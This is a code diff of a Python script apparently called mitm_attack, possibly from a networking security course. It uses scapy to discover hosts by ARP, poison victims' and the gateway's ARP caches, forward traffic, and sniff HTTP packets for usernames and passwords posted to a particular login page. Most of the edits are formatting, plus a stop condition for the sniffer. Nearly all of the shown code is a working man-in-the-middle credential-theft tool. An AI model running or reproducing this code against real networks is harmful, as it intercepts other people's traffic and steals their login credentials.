@@ -3,7 +3,7 @@
 import scapy.all as scapy
 from urllib import unquote
 from threading import Thread, Event
-import time,sys,re,subprocess
+import time, sys, re, subprocess
 
 def enable_ip_forward():
 	# Enables IP Forward in linux
@@ -20,17 +20,17 @@ class Sniffer(Thread):
 	def run(self):
 		print("[*] Start packet Sniffing...")
 		print("[*] Filtering possible Login info from http://140.113.207.246/login.php\n")
-		scapy.sniff(iface = 'enp0s3',store = False,prn = self.proc_of_pkt)
-	def join(self,timeout = None):
+		scapy.sniff(iface = 'enp0s3', store = False, prn = self.proc_of_pkt, stop_filter = self.should_stop_sniffer)
+	def join(self, timeout = None):
 		self.stop_sniffer.set()
-		Thread.join(self,timeout)
+		Thread.join(self, timeout)
 	def should_stop_sniffer(self, packet):
 		return self.stop_sniffer.isSet()
-	def proc_of_pkt(self,packet):
+	def proc_of_pkt(self, packet):
 		data = str(packet)
 		pattern = re.compile(r'usr=.*&pwd=.*&btn_login=Login')
 		# target: "usr=USERNAME&pwd=PASSWORD&btn_login=Login"
-		result = re.findall(pattern,data)
+		result = re.findall(pattern, data)
 		if result:
 			print("[*] WE GOT A HIT! Printing the output:")
 			for res in result:
@@ -42,19 +42,19 @@ def scan(ip):
 	arp_req = scapy.ARP(pdst = ip)
 	broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
 	arp_req_broadcast = broadcast/arp_req
-	ans = scapy.srp(arp_req_broadcast,timeout = 1,verbose = False)[0]
+	ans = scapy.srp(arp_req_broadcast,timeout = 1, verbose = False)[0]
 	client_list = []
 	for element in ans:
 		client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
 		client_list.append(client_dict)
 	return client_list
 def spoofing(target,spoof):
-	packet = scapy.ARP(op = 2,pdst = target['ip'],hwdst = target['mac'],psrc = spoof['ip'])
+	packet = scapy.ARP(op = 2, pdst = target['ip'], hwdst = target['mac'], psrc = spoof['ip'])
 	#print(packet.show())
 	scapy.send(packet,verbose = False)
 def restore(dst,src):
-	packet = scapy.ARP(op = 2,pdst = dst['ip'],hwdst = dst['mac'],psrc = src['ip'],hwsrc = src['mac'])
-	scapy.send(packet,count = 4,verbose = False)
+	packet = scapy.ARP(op = 2, pdst = dst['ip'], hwdst = dst['mac'], psrc = src['ip'], hwsrc = src['mac'])
+	scapy.send(packet, count = 4, verbose = False)
 def main():
 	if os.geteuid() != 0:
 		print("./mitm_attack: Permission denied")
@@ -91,8 +91,8 @@ def main():
 		print("[*] ARP spoofing is terminated, restoring ARP table")
 		for victim in victims:
 			if victim != gateway:
-				restore(victim,gateway)
-				restore(gateway,victim)
+				restore(victim, gateway)
+				restore(gateway, victim)
 		print("[*] Sucessfully restoring ARP table")
 
 
